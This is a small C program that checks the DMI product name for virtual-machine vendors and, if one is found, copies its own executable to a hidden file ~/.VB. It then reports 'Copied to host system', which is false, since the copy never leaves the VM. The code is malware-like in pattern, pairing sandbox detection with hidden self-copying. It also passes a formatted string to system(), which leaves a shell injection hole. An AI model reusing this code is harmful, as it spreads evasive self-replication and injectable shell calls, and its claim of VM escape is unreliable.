#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int is_virtual_machine() {
    FILE *fp;
    char buffer[128];

    fp = popen("cat /sys/class/dmi/id/product_name 2>/dev/null", "r");
    if (fp == NULL) return 0;

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strstr(buffer, "VirtualBox") || strstr(buffer, "VMware") ||
            strstr(buffer, "QEMU") || strstr(buffer, "KVM")) {
            pclose(fp);
            return 1;
        }
    }
    pclose(fp);
    return 0;
}

void show_message(const char *message) {
    printf("NOTIFICATION: %s\n", message);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "notify-send 'VB' '%s'", message);
    system(cmd);
}

void copy_to_host() {
    char cmd[512];
    const char *home = getenv("HOME");
    
    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s/.VB\" 2>/dev/null", 
             "/proc/self/exe", home);
    
    if (system(cmd) == 0) {
        show_message("Copied to host system: ~/.VB");
    } else {
        show_message("Failed to copy to host system");
    }
}

int main() {
    if (is_virtual_machine()) {
        show_message("Running on VM! Copying to host...");
        copy_to_host();
    } else {
        show_message("Running on host system");
    }
    return 0;
}
